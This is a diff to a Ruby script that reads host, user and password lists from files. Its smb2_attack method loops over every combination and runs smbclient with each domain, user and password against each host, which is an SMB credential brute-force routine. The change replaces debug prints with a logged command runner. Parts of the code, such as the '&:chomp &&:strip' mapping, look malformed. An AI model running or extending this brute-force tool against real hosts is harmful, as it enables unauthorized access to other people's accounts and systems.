@@ -43,16 +43,18 @@ def create_lists(arg)
   @hosts = File.readlines(arg[:hosts]).map(&:chomp &&:strip)
   @users = File.readlines(arg[:users]).map(&:chomp &&:strip)
   @pass  = File.readlines(arg[:passwords]).map(&:chomp &&:strip)
-  puts @hosts
-  puts @users
-  puts @pass
+end
+
+def command
+  @log = Logger.new('debug.log')
+  cmd = TTY::Command.new(output: @log)
 end
 
 def smb2_attack(arg)
   @hosts.each do |host|
     @users.each do |user|
       @pass.each do |pass|
-        out, err = @cmd.run!("@smbclient #{arg[:domain]}/#{user}:#{pass}@#{host}")
+        out, err = command.run!("@smbclient #{arg[:domain]}/#{user}:#{pass}@#{host}")
         puts out
       end
     end
